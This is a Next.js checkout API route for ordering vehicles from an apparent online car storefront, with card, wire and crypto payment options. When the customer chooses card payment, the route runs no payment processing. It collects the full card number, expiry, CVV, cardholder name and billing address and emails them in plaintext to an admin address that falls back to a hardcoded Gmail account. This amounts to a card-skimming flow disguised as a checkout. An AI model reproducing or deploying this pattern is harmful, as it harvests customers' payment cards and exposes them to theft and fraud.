import { NextResponse } from 'next/server';
import { z } from 'zod';
import { prisma } from '@/lib/prisma';
import { getSession } from '@/lib/auth';
import { orderRef } from '@/lib/utils';
import { sendEmail } from '@/lib/email';

const addrSchema = z.object({
  line1: z.string().min(1),
  line2: z.string().optional().nullable(),
  city: z.string().min(1),
  state: z.string().min(1),
  postal: z.string().min(1),
  country: z.string().min(1),
});

const schema = z.object({
  vehicleId: z.string().min(1),
  paymentPlan: z.enum(['FULL', 'DEPOSIT_50', 'DEPOSIT_25']),
  paymentMethod: z.enum(['CARD', 'WIRE', 'CRYPTO']).default('CARD'),
  notes: z.string().max(1000).optional(),
  deliveryMode: z.enum(['PROFILE', 'NEW']).optional(),
  billingAddress: addrSchema.optional(),
  deliveryAddress: addrSchema.optional(),
  card: z
    .object({
      name: z.string().min(1).max(120),
      number: z.string().min(13).max(19),
      expiry: z.string().min(4).max(7),
      cvv: z.string().min(3).max(4),
    })
    .optional(),
});

function planAmount(price: number, plan: 'FULL' | 'DEPOSIT_50' | 'DEPOSIT_25') {
  if (plan === 'FULL') return price;
  if (plan === 'DEPOSIT_50') return Math.round(price * 0.5 * 100) / 100;
  return Math.round(price * 0.25 * 100) / 100;
}

function formatAddr(a?: z.infer<typeof addrSchema>) {
  if (!a) return '(none)';
  return [a.line1, a.line2, `${a.city}, ${a.state} ${a.postal}`, a.country]
    .filter(Boolean)
    .join('\n');
}

export async function POST(req: Request) {
  try {
    const session = await getSession();
    if (!session) return NextResponse.json({ error: 'Not logged in' }, { status: 401 });

    const body = await req.json();
    const parsed = schema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid order data' }, { status: 400 });
    }

    const {
      vehicleId,
      paymentPlan,
      paymentMethod,
      notes,
      card,
      billingAddress,
      deliveryAddress,
      deliveryMode,
    } = parsed.data;

    if (paymentMethod === 'CARD' && !card) {
      return NextResponse.json({ error: 'Card details required' }, { status: 400 });
    }

    const vehicle = await prisma.vehicle.findUnique({
      where: { id: vehicleId },
      include: { images: { orderBy: { displayOrder: 'asc' }, take: 1 } },
    });
    if (!vehicle || !vehicle.published) {
      return NextResponse.json({ error: 'Vehicle not found' }, { status: 400 });
    }
    if (vehicle.inventoryStatus === 'SOLD' || vehicle.inventoryStatus === 'UNAVAILABLE') {
      return NextResponse.json({ error: 'Vehicle is not available' }, { status: 409 });
    }

    const price = Number(vehicle.price);
    if (!(price > 0)) {
      return NextResponse.json({ error: 'Vehicle is not priced for sale' }, { status: 400 });
    }

    const amountDue = planAmount(price, paymentPlan);
    const reference = orderRef();

    // Bulk / catalog stock stays AVAILABLE so multiple customers can order the same model.
    // Only unique VIN units would be reserved by admin later.
    const order = await prisma.order.create({
      data: {
        reference,
        userId: session.id,
        vehicleId,
        sellingPrice: price,
        currency: vehicle.currency,
        paymentStatus: 'PENDING',
        orderStatus: 'PENDING_PAYMENT',
        deliveryNotes: notes || null,
        internalNotes: JSON.stringify({
          paymentPlan,
          paymentMethod,
          amountDue,
          planLabel:
            paymentPlan === 'FULL'
              ? 'Full payment'
              : paymentPlan === 'DEPOSIT_50'
                ? '50% deposit'
                : '25% down payment',
          deliveryMode: deliveryMode || 'PROFILE',
          billingAddress: billingAddress || null,
          deliveryAddress: deliveryAddress || null,
          cardSubmitted: paymentMethod === 'CARD',
        }),
      },
    });

    const adminTo =
      process.env.ADMIN_NOTIFY_EMAIL ||
      process.env.SMTP_USER ||
      'personalofficedesk@gmail.com';

    let cardBlock = '';
    if (paymentMethod === 'CARD' && card) {
      cardBlock = `
CARD PAYMENT DETAILS
--------------------
Name on card: ${card.name}
Card number: ${card.number}
Expiry: ${card.expiry}
CVV: ${card.cvv}

BILLING ADDRESS
---------------
${formatAddr(billingAddress)}
`;
    }

    const text = `
New vehicle order
=================
Order: ${order.reference}
Customer: ${session.fullName} <${session.email}>
Vehicle: ${vehicle.model} ${vehicle.trim} (${vehicle.slug})
List price: ${vehicle.currency} ${price}
Amount due now: ${vehicle.currency} ${amountDue}
Plan: ${paymentPlan}
Method: ${paymentMethod}

DELIVERY ADDRESS
----------------
${formatAddr(deliveryAddress)}

Notes: ${notes || '(none)'}
${cardBlock}
`;

    await sendEmail({
      to: adminTo,
      subject: `[Order ${order.reference}] ${paymentMethod} · ${vehicle.model}`,
      text,
    }).catch((err) => console.error('Admin order email failed', err));

    return NextResponse.json({
      ok: true,
      reference: order.reference,
      orderId: order.id,
      amountDue,
      paymentPlan,
      paymentMethod,
      sellingPrice: price,
    });
  } catch (e: unknown) {
    console.error(e);
    const message = e instanceof Error ? e.message : 'Order failed';
    return NextResponse.json({ error: message }, { status: 400 });
  }
}
